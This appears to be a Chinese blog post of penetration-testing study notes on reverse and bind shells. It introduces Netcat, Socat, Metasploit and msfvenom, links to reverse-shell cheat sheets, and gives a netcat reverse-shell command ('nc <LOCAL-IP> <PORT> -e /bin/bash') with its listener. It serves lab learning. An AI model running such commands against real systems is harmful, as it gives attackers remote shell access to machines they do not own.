
<!DOCTYPE html><html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1" theme-name="Stellar" theme-version="1.28.1">
  
  <meta name="generator" content="Hexo 7.2.0">
  <meta http-equiv='x-dns-prefetch-control' content='on' />
  
  <meta name="renderer" content="webkit">
  <meta name="force-rendering" content="webkit">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  <meta name="HandheldFriendly" content="True" >
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="theme-color" media="(prefers-color-scheme: light)" content="#f9fafb">
  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
  
  <title>shell学习 - hybcx's blog</title>

  
    <meta name="description" content="0x01 什么是shell 在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和 Powershell 也是shell。在针对远程系统时，有时可以强制应用程序在服务器上运行(例如">
<meta property="og:type" content="article">
<meta property="og:title" content="shell学习">
<meta property="og:url" content="http://hybcx.xyz/2024/03/24/shell-xue-xi/index.html">
<meta property="og:site_name" content="hybcx&#39;s blog">
<meta property="og:description" content="0x01 什么是shell 在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和 Powershell 也是shell。在针对远程系统时，有时可以强制应用程序在服务器上运行(例如">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104102689.png">
<meta property="og:image" content="http://hybcx.xyz/2024/03/24/shell-xue-xi/image-20240324104427246.png">
<meta property="og:image" content="http://hybcx.xyz/2024/03/24/shell-xue-xi/image-20240324104654304.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104750168.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104929187.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105316573.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324105811487.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111042250.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324111226451.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114025471.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114138826.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324114828531.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324115749745.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120207677.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120249831.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120352118.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324120523825.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324121003377.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324160725346.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161500055.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324161723719.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162030799.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162139519.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162240125.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324162539238.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164350846.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164815702.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324164832964.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165101678.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165248044.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165307528.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165413527.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165612429.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324165911242.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170020857.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170035621.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170258431.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170311947.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170831602.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324170850376.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171219376.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171226107.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171455324.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171507775.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171817435.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171832766.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324171958465.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172003728.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172342525.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172401802.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172452503.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324172446164.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173034082.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173108405.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324173833707.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174211582.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174435663.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174910205.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324174901070.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175029199.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175225124.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324175446521.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180823212.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180831608.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180840222.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324180849107.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181134375.png">
<meta property="og:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324181429758.png">
<meta property="article:published_time" content="2024-03-24T02:06:10.722Z">
<meta property="article:modified_time" content="2024-05-03T08:55:14.616Z">
<meta property="article:author" content="hybcx">
<meta property="article:tag" content="Metasploit">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104102689.png">
  
  
  
  <meta name="keywords" content="Metasploit">

  <!-- feed -->
  
    <link rel="alternate" href="/atom.xml" title="hybcx's blog" type="application/atom+xml">
  

  <link rel="stylesheet" href="/css/main.css?v=1.28.1">

  
    <link rel="shortcut icon" href="/medias/logo.png">
  

  
    
<link rel="stylesheet" href="https://gcore.jsdelivr.net/gh/highlightjs/cdn-release@11.9.0/build/styles/atom-one-dark.min.css">

  

  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'">

<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>
<body>

<div class="l_body s:aa content tech" id="start" layout="post" ><aside class="l_left"><div class="leftbar-container">


<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/medias/avatar.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">hybcx's blog</div><div class="sub normal cap">人生当是精彩的</div><div class="sub hover cap" style="opacity:0"> 何必忧虑未来！</div></a></div></header>

<div class="nav-area">
<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>


<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a><a class="nav-item" title="友链" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
</div>
<div class="widgets">


<widget class="widget-wrapper post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2024/05/21/ciscn-2024wp/"><span class="title">CISCN-2024Wp</span></a><a class="item title" href="/2024/05/12/h-nctf2024/"><span class="title">H&NCTF2024</span></a><a class="item title" href="/2024/04/30/hnctf-2022/"><span class="title">HNCTF2022</span></a><a class="item title" href="/2024/04/23/php-xue-xi-zong-jie/"><span class="title">PHP学习总结</span></a><a class="item title" href="/2024/05/02/misc-shua-ti-zhi-lu/"><span class="title">MISC-刷题之旅</span></a><a class="item title" href="/2024/05/05/tmh-huan-chong-qu-yi-chu/"><span class="title">TMH-缓冲区溢出学习</span></a><a class="item title" href="/2024/05/05/di-shi-wu-jie-quan-qian-bei-wp/"><span class="title">第十五届圈钱杯wp</span></a><a class="item title" href="/2024/03/29/thm-jin-gong-xing-shen-tou-ce-shi/"><span class="title">THM-进攻性渗透测试</span></a><a class="item title" href="/2024/03/26/gdouctf-2023/"><span class="title">GDOUCTF2023</span></a><a class="item title" href="/2024/03/29/i-chun-qiu-shua-ti-ji-lu/"><span class="title">i春秋CTF刷题</span></a></div></widget>
</div>
<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/hybchenxing/" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/github-logo2.png"/></a><a class="social" href="https://music.163.com/#/user/home?id=9895561810" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/neteasemusic-icon.png"/></a><a class="social" href="https://space.bilibili.com/1761635300" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/bilibili-icon.png"/></a><a class="social" href="https://muselink.cc/hybcx" target="_blank" rel="external nofollow noopener noreferrer"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://upyun.thatcdn.cn/public/img/icon/weChat.png"/></a><a class="social" href="javaScript:void('永夜');" rel="noopener noreferrer"><img class="lazy" id="ThemeM" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/moon.svg"/></a><a class="social" href="javaScript:void('永昼');" rel="noopener noreferrer"><img class="lazy" id="ThemeL" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/custom/svg/sun.svg"/></a></div></footer>
</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/Metasploit/">Metasploit</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-24T02:06:10.722Z">2024-03-24</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-05-03T08:55:14.616Z">2024-05-03</time></span></div></div></div>
    
    <div class="bottom only-title">
      
      <div class="text-area">
        <h1 class="text title"><span>shell学习</span></h1>
        
      </div>
    </div>
    
  </div>
  </div><article class="md-text content"><h1 id="0x01-什么是shell">0x01 什么是shell</h1>
<p>在我们了解 发送和接收shell之前，知道 shell 实际上是什么非常重要。用最简单的术语来说，我们在与命令行环境(CLI)做接口时所使用的就是shell。换句话说，Linux 中常见的 bash 或 sh 程序就是 shell，Windows 上的 cmd.exe 和 Powershell 也是shell。在针对远程系统时，有时可以强制应用程序在服务器上运行(例如 webserver)来执行任意代码，当这种情况发生时，我们希望使用这个初始访问来获得在目标上运行的 shell。</p>
<p>简单地说，我们可以强制远程服务器向我们发送对服务器的命令行访问(反向 shell) ，或者在服务器上打开一个端口，我们可以连接到这个端口以执行更多的命令(绑定 shell)。</p>
<p>我们将在整个房间中更详细地介绍这两种场景。</p>
<p>这个房间的格式如下：</p>
<ul>
<li>房间的大部分内容由信息组成，代码块和屏幕截图中给出了示例。</li>
<li>房间的最后两项任务中有两台虚拟机——一台是 Linux，一台是 Windows。这些可以用来练习所演示的技术。</li>
<li>任务 13 中有示例练习题。请随意完成这些练习，或者在完成任务时按照任务进行操作。</li>
</ul>
<p>话不多说，让我们开始吧！</p>
<h1 id="0x02-工具介绍">0x02 工具介绍</h1>
<p>我们将使用多种工具来接收反向 shell 和发送绑定 shell。一般来说，我们需要恶意的 shell 代码，以及与生成的 shell 进行接口的方法。我们将在下面简要讨论其中的每一项:</p>
<h2 id="netcat">Netcat</h2>
<p>Netcat 是传统的网络“瑞士军刀”。它用于手动执行各种网络交互，包括在枚举时抓取banner（横幅），更重要的是，它可以用于接收反向shell以及连接到远程端口以绑定目标系统上的shell。Netcat shells在默认情况下非常不稳定(容易丢失) ，但是我们可以通过一定技术来加以改进。</p>
<h2 id="socat">Socat</h2>
<p>Socat 就像升级版的 Netcat。它可以做和Netcat相同的事情，而且能够做更多。Socat shells 通常比开箱即用的 Netcat shells更稳定。从这个意义上说，它远远优于 netcat;</p>
<p>然而，Socat也有两个大的缺陷:</p>
<ol>
<li>Socat语法更加困难</li>
<li>在默认情况下，几乎每个 Linux 发行版都会安装Netcat，但很少会默认安装Socat</li>
</ol>
<blockquote>
<p>Netcat和Socat在 Windows 上都有.exe 版本</p>
</blockquote>
<h2 id="metasploit-multihandler">Metasploit – multi/handler</h2>
<p>Metasploit 框架的 auxiliary/multi/handler 模块与 socat 和 netcat 一样，可以用于接收反向 shell。由于是 Metasploit 框架的一部分，multi/handler 提供了一种获得稳定 shell 的完全成熟的方法，并提供了多种进一步改进所捕获的 shell 的选项。<br>
multi/handler模块是可以与 meterpreter shell 进行交互的方法，并且也是处理分段payload（有效载荷）的最简单方法。</p>
<h2 id="msfvenom">Msfvenom</h2>
<p>与multi/handler一样，msfvenom在技术上也是 Metasploit 框架的一部分，然而，它是作为一个独立的工具发布的。msfvenom用于动态生成payload，Msfvenom可以产生除了反向shell和绑定shell以外的其他payload（有效载荷）。</p>
<p>除了我们已经介绍过的工具之外，还有许多用不同编程语言书写的 关于shell利用的项目和资料，比如：</p>
<ol>
<li><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources/Reverse Shell <a target="_blank" rel="noopener" href="http://Cheatsheet.md">Cheatsheet.md</a></li>
<li><a target="_blank" rel="noopener" href="https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></li>
<li>Kali Linux 预先安装了各种webshells，默认路径是：/usr/share/webshells</li>
<li>还有一个项目虽然主要是发挥字典功能，但是也包含了一些非常有用的 用于获取shell的代码：<a target="_blank" rel="noopener" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
</ol>
<h1 id="0x03-shell类型">0x03 shell类型</h1>
<p>从更高的层次上来说，当涉及到一个可利用目标时，我们只对两种 shell 感兴趣:</p>
<ol>
<li>反向 shell ，</li>
<li>绑定 shell。</li>
</ol>
<h2 id="reverse-shells反向shell">Reverse shells（反向shell）</h2>
<p>反向 shell 是指目标被迫执行一段代码 并以此连接到你的计算机，在你自己的计算机上，你可以使用前面提到的工具之一来设置一个用于接收连接的监听器。</p>
<p>反向 shell 是绕过防火墙规则的一个好方法，因为防火墙规则 可能会阻止你正向连接到目标上的任意端口；然而，有一个缺点是：当从互联网上的一台机器接收 shell 时，你需要先配置好你自己的网络。</p>
<h2 id="bind-shells绑定shell">Bind shells（绑定shell）</h2>
<p>当在目标上执行的代码用于启动一个直接连接到目标机器的shell的监听器时，就称为绑定 shell。然后，这将使目标向互联网开放，这意味着你可以连接到代码打开的端口，并通过这种方式获得远程代码执行。</p>
<p>这样做的好处是 不需要你在自己的网络上进行任何配置，但是该行为可能会被保护目标的防火墙加以阻止。</p>
<p><em>一般情况下，反向 shell 更容易执行和调试。</em></p>
<p><strong>反向shell的例子</strong></p>
<p>请看下面的图片。<br>
在左边，我们有一个反向 shell 侦听器——它接收连接，而右边是发送反向 shell 的模拟目标。实际上，这更可能是通过远程网站上的代码注入或类似的注入来完成的。<br>
把左边的图像想象成你自己的电脑，把右边的图像想象成你的目标。</p>
<pre><code class="hljs scss">#在攻击机（你的kali系统）上:
sudo nc -lvnp <span class="hljs-number">443</span>

#在目标机上：
nc &lt;LOCAL-IP&gt; &lt;PORT&gt; -e /bin/bash     #&lt;LOCAL-IP&gt; &lt;PORT&gt; 指的是攻击机上的ip和正在监听的端口</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240324104102689.png" alt="image-20240324104102689"></p>
<p>注意，在右边运行命令之后，左边的监听器将接收到一个连接，连接成功后，运行 whoami 命令，能看到我们能够作为目标用户去执行命令，重要的是：我们在监听我们自己的攻击机上的端口，由目标机发送连接到攻击机。</p>
<p><strong>绑定shell的例子</strong></p>
